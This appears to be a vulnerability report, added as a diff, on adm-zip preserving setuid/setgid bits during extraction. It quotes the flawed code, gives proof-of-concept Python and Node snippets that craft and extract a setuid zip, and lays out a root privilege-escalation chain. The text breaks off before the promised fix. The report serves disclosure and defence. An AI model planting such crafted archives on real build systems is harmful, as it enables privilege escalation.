@@ -1,0 +1,64 @@
+adm-zip applies the Unix permission bits stored in a zip entry directly to the extracted file via fs.chmodSync() when keepOriginalPermission=true is passed to extractAllTo()/extractEntryTo() — and it never filters the setuid/setgid/sticky bits out of those bits. A zip crafted by an attacker can therefore produce an extracted binary with mode 04755. When extraction runs as root (the default posture in Docker builds, CI runners, and privileged install steps — the exact environments where this flag is used), the resulting root-owned setuid file is executed later by a lesser-privileged user, turning the attacker's code into a root execution.
+
+Details
+The mode a zip entry wants is read back from the external file attributes in the header, and the mask used keeps every special bit:
+
+// headers/entryHeader.js:187
+get fileAttr() {
+    return (_attr || 0) >> 16 & 0xfff;
+}
+0xfff is 0o7777 — it preserves setuid (0o4000), setgid (0o2000) and the sticky bit (0o1000) along with the rwx bits. Shifting by 16 is the standard Unix convention for where zip stores the mode; the mask is the problem.
+
+When the flag is on, that value goes straight to the write:
+
+// adm-zip.js:726-727 (extractEntryTo, and identically in extractAllTo)
+const fileAttr = keepOriginalPermission ? entry.header.fileAttr : undefined;
+filetools.writeFileTo(target, content, overwrite, fileAttr);
+// util/utils.js:94
+self.fs.chmodSync(path, attr || 0o666);
+No & 0o777, no stripping of 0o7000. Attacker-controlled bytes in the zip decide the final mode of a file the library creates on disk. Directory entries are affected too (adm-zip.js:855), so a setgid bit on a directory entry also carries over and gives new files inside it group inheritance.
+
+PoC
+Tested against adm-zip@0.6.0 (latest as of 2026-08-01), Node 22, Linux.
+
+Craft a zip with a setuid binary using standard tooling (this is the
+realistic attacker path — no adm-zip APIs involved in creating it):
+python3 -c "
+import zipfile
+zi = zipfile.ZipInfo('pysuidbin')
+zi.external_attr = 0o4755 << 16
+with zipfile.ZipFile('evil.zip', 'w') as z:
+    z.writestr(zi, '#!/bin/sh\nid\n')
+"
+Extract with the flag enabled:
+const AdmZip = require('adm-zip');
+new AdmZip('evil.zip').extractAllTo('/tmp/out', true, true);
+
+const fs = require('fs');
+const st = fs.statSync('/tmp/out/pysuidbin');
+console.log((st.mode & 0o7777).toString(8));
+// => 4755   (setuid bit set — the file is root-owned if the extractor runs as root)
+Control — same zip, default extraction (keepOriginalPermission=false):
+mode comes out 0666, no setuid. The flag is the enabler.
+Alternative supply path, if the zip is built in-process with adm-zip's own API:
+
+const zip = new AdmZip();
+zip.addFile('suidbin', Buffer.from('#!/bin/sh\nid\n'), '', 0o4755);
+zip.writeZip('evil.zip');
+new AdmZip('evil.zip').extractAllTo('/tmp/out', true, true);
+// same result: stat mode & 0o7777 === 0o4755
+Impact
+Privilege escalation.
+The vulnerability class is CWE-732 (incorrect permission assignment): permission bits taken from untrusted input are applied with no filtering.
+
+Realistic chain:
+
+Attacker supplies a zip (upload endpoint, fetched dependency archive, artifact in a build script — no special access needed to produce the file).
+A pipeline or service extracts it as root with keepOriginalPermission=true. Docker builds run as root by default and CI/install steps commonly do too; this flag is specifically the tooling used in permission-preserving deploy flows.
+The root-owned setuid file leaves the build, typically preserved by cp -a/rsync mode-bit propagation, into the runtime environment.
+An unprivileged app user or service account executes it (the standard build-as-root/run-as-user model) — the attacker's code runs as root.
+Who is impacted: applications and pipelines that extract untrusted archives with keepOriginalPermission=true while running as root.
+Default-usage deployments (flag off) are not affected; non-root extraction results in a harmless self-owned setuid file.
+Severity: Medium
+
+Suggested fix, one line in the getter:
